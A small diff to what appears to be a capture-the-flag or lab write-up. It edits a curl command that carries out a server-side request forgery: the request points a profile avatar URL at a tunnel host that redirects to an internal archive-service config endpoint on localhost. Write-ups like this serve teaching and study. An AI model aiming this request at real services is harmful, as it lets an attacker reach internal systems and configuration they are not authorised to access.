@@ -101,7 +101,7 @@ def do_GET(self):
 and pointed `/profile/avatar` at it, redirecting to the internal archive-service
 
 ```bash
-curl -b cookies.txt -X POST http://172.198.60.104:8081/profile/avatar \
+curl -b cookies.txt -X POST 172.198.60.104:8081/profile/avatar \
   -H "Content-Type: application/json" \
   -d '{"url":"https://<tunnel-host>/?to=http://127.0.0.1:39417/archive/config&code=307"}'
 ```
